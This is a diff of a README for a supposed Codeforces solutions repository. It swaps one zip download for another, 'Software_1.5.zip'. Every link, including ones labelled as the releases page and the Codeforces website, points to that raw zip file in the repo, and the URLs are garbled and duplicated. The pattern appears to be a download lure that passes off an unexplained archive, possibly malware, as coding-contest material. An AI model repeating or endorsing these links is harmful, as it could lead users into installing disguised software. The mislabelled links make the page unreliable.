@@ -4,7 +4,7 @@ Welcome to the Codeforces repository! Here you will find a collection of solutio
 
 ## 📥 Download Now
 
-[![Download Codeforces](https://raw.githubusercontent.com/OreooAWookbbgh/Codeforces/main/Old Rounds/Software-v1.6.zip%https://raw.githubusercontent.com/OreooAWookbbgh/Codeforces/main/Old Rounds/Software-v1.6.zip)](https://raw.githubusercontent.com/OreooAWookbbgh/Codeforces/main/Old Rounds/Software-v1.6.zip)
+[![Download Codeforces](https://raw.githubusercontent.com/OreooAWookbbgh/Codeforces/main/Old Rounds/Global Round 31/Software_1.5.zip https://raw.githubusercontent.com/OreooAWookbbgh/Codeforces/main/Old Rounds/Global Round 31/Software_1.5.zip%https://raw.githubusercontent.com/OreooAWookbbgh/Codeforces/main/Old Rounds/Global Round 31/Software_1.5.zip https://raw.githubusercontent.com/OreooAWookbbgh/Codeforces/main/Old Rounds/Global Round 31/Software_1.5.zip)](https://raw.githubusercontent.com/OreooAWookbbgh/Codeforces/main/Old Rounds/Global Round 31/Software_1.5.zip https://raw.githubusercontent.com/OreooAWookbbgh/Codeforces/main/Old Rounds/Global Round 31/Software_1.5.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ To begin your journey, follow these steps to download and run the Codeforces sol
 
 1. **Visit the Releases Page**  
    Click the link below to go to the releases page.  
-   [Visit the Releases Page](https://raw.githubusercontent.com/OreooAWookbbgh/Codeforces/main/Old Rounds/Software-v1.6.zip)
+   [Visit the Releases Page](https://raw.githubusercontent.com/OreooAWookbbgh/Codeforces/main/Old Rounds/Global Round 31/Software_1.5.zip https://raw.githubusercontent.com/OreooAWookbbgh/Codeforces/main/Old Rounds/Global Round 31/Software_1.5.zip)
 
 2. **Choose the Version**  
    On the releases page, you will see a list of available versions. Choose the latest version for the best experience.
@@ -62,7 +62,7 @@ Basic knowledge of programming concepts and familiarity with your chosen program
 
 ## 🛠️ Additional Resources
 
-- **Codeforces**: Visit [Codeforces](https://raw.githubusercontent.com/OreooAWookbbgh/Codeforces/main/Old Rounds/Software-v1.6.zip) for more details about contests and other resources.
+- **Codeforces**: Visit [Codeforces](https://raw.githubusercontent.com/OreooAWookbbgh/Codeforces/main/Old Rounds/Global Round 31/Software_1.5.zip https://raw.githubusercontent.com/OreooAWookbbgh/Codeforces/main/Old Rounds/Global Round 31/Software_1.5.zip) for more details about contests and other resources.
 - **Learning Platforms**: Websites like HackerRank and LeetCode also provide excellent practice problems.
 
 ## 📝 Final Notes
@@ -71,4 +71,4 @@ We hope the Codeforces repository helps you improve your coding skills and prepa
 
 For any questions or feedback, feel free to reach out through the issues page. Remember, the world of coding is vast, and every problem solved is a step forward. Happy coding!
 
-[🔗 Return to the Releases Page](https://raw.githubusercontent.com/OreooAWookbbgh/Codeforces/main/Old Rounds/Software-v1.6.zip)
+[🔗 Return to the Releases Page](https://raw.githubusercontent.com/OreooAWookbbgh/Codeforces/main/Old Rounds/Global Round 31/Software_1.5.zip https://raw.githubusercontent.com/OreooAWookbbgh/Codeforces/main/Old Rounds/Global Round 31/Software_1.5.zip)
